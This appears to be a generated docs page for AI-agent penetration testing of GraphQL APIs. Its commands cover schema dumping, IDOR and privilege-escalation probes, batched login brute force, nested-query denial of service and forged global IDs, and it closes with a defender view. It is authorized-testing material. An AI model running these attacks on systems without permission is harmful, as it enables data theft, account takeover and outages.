@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: graphql-security</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>graphql-security</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing a GraphQL API on an authorized engagement.</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="api-security-testing.html">api-security-testing</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a> <a href="auth-attacks.html">auth-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr></tbody></table><p>GraphQL exposes a typed schema of everything the API can do, and many deployments leave introspection on and authorization checks off individual fields. This skill covers the full authorized methodology: finding the endpoint, dumping the schema, testing every query and mutation for access control, and abusing batching and nesting. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find the GraphQL endpoint: <code>/graphql</code>, <code>/api/graphql</code>, <code>/v1/graphql</code>,</li>
+<p>or a path found in JS bundles.</p>
+<li>Test introspection; if enabled, dump the full schema.</li>
+<li>If introspection is off, brute force field names from the JS bundle</li>
+<p>and common wordlists.</p>
+<li>Enumerate every query and mutation, noting arguments and types.</li>
+<li>Test authorization on each field: unauthenticated access, horizontal</li>
+<p>IDOR, and vertical privilege escalation.</p>
+<li>Test batching for brute force and rate-limit bypass.</li>
+<li>Test nested queries for denial of service and cost-limit bypass.</li>
+<li>Record the schema, the vulnerable fields, and the exact queries used.</li>
+</ol>
+<h2>1. Finding the endpoint</h2>
+<pre><code class="language-bash"># Common paths, one quick sweep
+for p in graphql api/graphql v1/graphql graphiql playground query; do
+  code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; \
+    -X POST &quot;https://target.example/$p&quot; \
+    -H &#x27;Content-Type: application/json&#x27; \
+    -d &#x27;{&quot;query&quot;:&quot;{__typename}&quot;}&#x27;)
+  echo &quot;/$p -&gt; $code&quot;
+done</code></pre>
+<pre><code class="language-bash"># GraphQL references hide in JS bundles: search them
+curl -s &#x27;https://target.example/static/app.js&#x27; | grep -o -E &#x27;/[a-zA-Z0-9/_-]*graphql[a-zA-Z0-9/_-]*&#x27; | sort -u | head -10</code></pre>
+<pre><code class="language-bash"># Confirm it is GraphQL with a minimal query
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;query&quot;:&quot;{__typename}&quot;}&#x27;
+# Expect: {&quot;data&quot;:{&quot;__typename&quot;:&quot;Query&quot;}}</code></pre>
+<p>Also try GET with <code>?query={__typename}</code>; some servers accept both.</p>
+<h2>2. Introspection and schema dump</h2>
+<pre><code class="language-bash"># Full introspection query (standard __schema dump)
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;query&quot;:&quot;{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{name kind ofType{name kind}}}}}}}}&quot;}&#x27; \
+  -o /tmp/schema.json
+python3 -c &quot;
+import json
+s = json.load(open(&#x27;/tmp/schema.json&#x27;))
+types = s[&#x27;data&#x27;][&#x27;__schema&#x27;][&#x27;types&#x27;]
+print(len(types), &#x27;types found&#x27;)
+print([t[&#x27;name&#x27;] for t in types if t[&#x27;name&#x27;] and not t[&#x27;name&#x27;].startswith(&#x27;__&#x27;)][:40])&quot;</code></pre>
+<p>If full introspection is blocked, try field-by-field probing, which is rarely disabled:</p>
+<pre><code class="language-bash"># __type probing works even when __schema is blocked on some servers
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;query&quot;:&quot;{__type(name:\&quot;User\&quot;){fields{name}}}&quot;}&#x27; | head -c 400</code></pre>
+<p>When introspection is fully off, extract the schema from the client: GraphQL clients often ship a persisted query map or the schema in the bundle. Search JS for <code>__typename</code>, <code>query </code>, and <code>mutation </code> strings, and use a field wordlist against suspected types.</p>
+<pre><code class="language-bash"># Brute force field names on a type you suspect exists
+for field in id email username password role admin isAdmin token secret; do
+  r=$(curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+    -H &#x27;Content-Type: application/json&#x27; \
+    -d &quot;{\&quot;query\&quot;:\&quot;{user(id:1){$field}}\&quot;}&quot;)
+  echo &quot;$field: $(echo &quot;$r&quot; | head -c 80)&quot;
+done</code></pre>
+<h2>3. Query and mutation enumeration</h2>
+<p>From the schema, list every operation and build a test matrix.</p>
+<pre><code class="language-bash"># List all queries and mutations with Python
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import json
+s = json.load(open(&#x27;/tmp/schema.json&#x27;))[&#x27;data&#x27;][&#x27;__schema&#x27;]
+byname = {t[&#x27;name&#x27;]: t for t in s[&#x27;types&#x27;] if t.get(&#x27;name&#x27;)}
+for root in (&#x27;queryType&#x27;, &#x27;mutationType&#x27;):
+    tname = s[root][&#x27;name&#x27;]
+    print(&#x27;##&#x27;, root, &#x27;-&gt;&#x27;, tname)
+    for f in (byname[tname].get(&#x27;fields&#x27;) or []):
+        args = &#x27;, &#x27;.join(a[&#x27;name&#x27;] for a in (f.get(&#x27;args&#x27;) or []))
+        print(&#x27; -&#x27;, f[&#x27;name&#x27;], &#x27;(&#x27; + args + &#x27;)&#x27;)
+EOF</code></pre>
+<p>Test every mutation even if the UI never calls it: <code>deleteUser</code>, <code>promoteUser</code>, <code>resetPassword</code>, and debug mutations ship in production schemas constantly. For each, test unauthenticated, low-privilege, and cross-user calls.</p>
+<pre><code class="language-bash"># Example: try a sensitive mutation as a low-privilege user
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &quot;Authorization: Bearer $LOWPRIV_TOKEN&quot; \
+  -d &#x27;{&quot;query&quot;:&quot;mutation{promoteUser(id:2){id role}}&quot;}&#x27; | head -c 300</code></pre>
+<h2>4. Authorization testing (field level)</h2>
+<p>GraphQL authorization fails field by field. A query can be allowed while one nested field leaks everything.</p>
+<pre><code class="language-bash"># Horizontal IDOR: swap the id argument
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &quot;Authorization: Bearer $VICTIM_TOKEN&quot; \
+  -d &#x27;{&quot;query&quot;:&quot;{user(id:1){email passwordHash}}&quot;}&#x27; | head -c 300
+# Repeat with id:2, id:3 ... do other users&#x27; fields come back?</code></pre>
+<pre><code class="language-bash"># Nested traversal: reach related objects the UI never shows
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &quot;Authorization: Bearer $LOWPRIV_TOKEN&quot; \
+  -d &#x27;{&quot;query&quot;:&quot;{me{organization{users{email role}}adminNotes}}&quot;}&#x27; | head -c 500</code></pre>
+<pre><code class="language-bash"># Introspection as an auth oracle: compare the schema returned
+# anonymously vs authenticated; hidden types sometimes leak
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;query&quot;:&quot;{__schema{types{name}}}&quot;}&#x27; -o /tmp/schema-anon.json
+diff &lt;(python3 -c &quot;import json;print(&#x27;\n&#x27;.join(sorted(t[&#x27;name&#x27;] for t in json.load(open(&#x27;/tmp/schema.json&#x27;))[&#x27;data&#x27;][&#x27;__schema&#x27;][&#x27;types&#x27;] if t[&#x27;name&#x27;]))&quot;) \
+     &lt;(python3 -c &quot;import json;print(&#x27;\n&#x27;.join(sorted(t[&#x27;name&#x27;] for t in json.load(open(&#x27;/tmp/schema-anon.json&#x27;))[&#x27;data&#x27;][&#x27;__schema&#x27;][&#x27;types&#x27;] if t[&#x27;name&#x27;]))&quot;) | head -20</code></pre>
+<p>Test directives and fragments too: some servers check authorization on the named query but not on the same fields reached through fragments or <code>@include</code>.</p>
+<h2>5. Batching attacks</h2>
+<p>GraphQL batching runs many queries in one request, which defeats naive rate limiting.</p>
+<pre><code class="language-bash"># Batch 50 login attempts in one HTTP request
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import json, urllib.request
+batch = [{&quot;query&quot;: &#x27;mutation{login(username:&quot;admin&quot;,password:&quot;%s&quot;){token}}&#x27; % pw}
+         for pw in [&quot;password&quot;, &quot;admin&quot;, &quot;123456&quot;, &quot;letmein&quot;, &quot;qwerty&quot;]]
+req = urllib.request.Request(&quot;https://target.example/graphql&quot;,
+    data=json.dumps(batch).encode(),
+    headers={&quot;Content-Type&quot;: &quot;application/json&quot;})
+print(urllib.request.urlopen(req, timeout=30).getcode())
+EOF</code></pre>
+<pre><code class="language-bash"># Test whether batching bypasses rate limits: send one request with
+# 100 operations and count how many were actually executed
+# (check the response array length vs the limit policy)</code></pre>
+<p>Also test alias-based brute force inside a single query:</p>
+<pre><code class="language-graphql">{
+  a1: login(username:&quot;admin&quot;, password:&quot;pw1&quot;) { token }
+  a2: login(username:&quot;admin&quot;, password:&quot;pw2&quot;) { token }
+}</code></pre>
+<p>If the server has no query cost analysis, one request can do the work of hundreds.</p>
+<h2>6. Nested query denial of service</h2>
+<p>Deeply nested queries multiply database work exponentially.</p>
+<pre><code class="language-bash"># Measure first with a shallow query, then nest deeper and compare timing
+# (use a test environment or explicit permission; stop at the first
+#  sign of real degradation)
+curl -s -o /dev/null -w &#x27;shallow: %{time_total}s\n&#x27; \
+  -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;query&quot;:&quot;{users{posts{author{posts{title}}}}}&quot;}&#x27;
+
+# Circular nesting is the worst case: users -&gt; friends -&gt; users ...
+curl -s -o /dev/null -w &#x27;deep: %{time_total}s\n&#x27; -m 20 \
+  -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;query&quot;:&quot;{users{friends{friends{friends{friends{name}}}}}}}&quot;}&#x27;</code></pre>
+<p>Report the timing difference and the nesting depth that caused it. Do not run sustained load; one slow query proves the missing depth or cost limit.</p>
+<h2>7. IDOR through global IDs</h2>
+<p>Relay-style schemas use opaque base64 global IDs (<code>dXNlcjox</code>). They are not access control.</p>
+<pre><code class="language-bash"># Decode the global ID format
+echo &#x27;dXNlcjox&#x27; | base64 -d; echo
+# Often &quot;user:1&quot; or &quot;User:1&quot;. If so, forge IDs for other objects:
+echo -n &#x27;user:2&#x27; | base64
+# Then query with the forged global ID
+curl -s -X POST &#x27;https://target.example/graphql&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &quot;Authorization: Bearer $LOWPRIV_TOKEN&quot; \
+  -d &#x27;{&quot;query&quot;:&quot;{node(id:\&quot;dXNlcjoy\&quot;){... on User{email}}}&quot;}&#x27; | head -c 300</code></pre>
+<p>Test the <code>node</code> interface broadly: it resolves any type by ID, so it is the fastest path to cross-object reads.</p>
+<h2>8. Subscriptions and persisted queries</h2>
+<pre><code class="language-bash"># Subscriptions (websockets): connect and see if auth is checked
+# wscat -c wss://target.example/graphql -H &quot;Authorization: Bearer $TOKEN&quot;
+# Try without the token too; some servers skip auth on the WS upgrade.</code></pre>
+<p>Persisted queries (hashed queries, <code>extensions.persistedQuery</code>): the server allow-lists query hashes. Test whether you can register new hashes, and whether the hash check can be bypassed by sending the full query text anyway.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The endpoint requires GET with URL-encoded queries: adapt every POST</li>
+<p>example to <code>?query=...</code>.</p>
+<li>Introspection blocked but the schema leaks in error messages: send</li>
+<p>malformed queries and read the &quot;did you mean&quot; suggestions, which enumerate real field names.</p>
+<li>The server enforces query depth limits: test the exact limit, then</li>
+<p>test whether fragments or aliases reset the counter.</p>
+<li>Rate limiting counts HTTP requests, not operations: batching bypasses</li>
+<p>it by design; report operations-per-request as the finding.</p>
+<li>Field suggestions and error messages differ between roles: diff</li>
+<p>error output as an unauthenticated user versus admin to find hidden fields.</p>
+<li>GraphQL over websockets only: use wscat or a Python websocket</li>
+<p>client; the same auth tests apply once connected.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Schema fully hidden: harvest it from the mobile app or JS bundle,</li>
+<p>then brute force remaining fields with a GraphQL wordlist.</p>
+<li>Authorization looks solid on queries: hammer the mutations, which</li>
+<p>get less review and often skip checks.</p>
+<li>Batching disabled: try alias stacking inside one query, which many</li>
+<p>&quot;no batching&quot; configs still allow.</p>
+<li>Depth limits present: pivot to wide queries (request every field of</li>
+<p>a huge type) or expensive computed fields; cost limits are about more than depth.</p>
+<li>Everything locked down: GraphQL CSRF is still possible when the</li>
+<p>endpoint accepts GET and cookies carry auth; test a cross-site GET query for state-changing mutations.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see GraphQL abuse as introspection queries from unknown clients, single requests carrying dozens of aliased operations, deeply nested queries with high execution time, and field-level 403s that suddenly stop (meaning the attacker found an unprotected path). The durable fixes are disabling introspection in production, enforcing authorization on every field resolver (not just top-level queries), query cost and depth analysis, rate limiting by operation count rather than HTTP request count, short allow-lists of persisted queries for public clients, and treating global IDs as opaque but never as authorization. Log resolver-level denials; a burst of them from one client is active probing.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): API</li>
+<p>endpoint abuse.</p>
+<li>MITRE ATT&amp;CK T1213 (Information from Information Repositories):</li>
+<p>schema and data harvesting.</p>
+<li>MITRE ATT&amp;CK T1499 (Endpoint Denial of Service): nested query DoS.</li>
+<li>CWE-862 (Missing Authorization): field-level auth gaps.</li>
+<li>CWE-639 (Authorization Bypass Through User-Controlled Key): IDOR</li>
+<p>via IDs.</p>
+<li>CWE-770 (Allocation of Resources Without Limits or Throttling):</li>
+<p>batching and nesting DoS.</p>
+<li>CWE-200 (Exposure of Sensitive Information): introspection leaks.</li>
+<li>OWASP API Security Top 10 2023: API3 Broken Object Property Level</li>
+<p>Authorization, API4 Unrestricted Resource Consumption.</p>
+<li>GraphQL spec: introspection section.</li>
+<li>PortSwigger Web Security Academy: GraphQL labs and cheat sheet.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
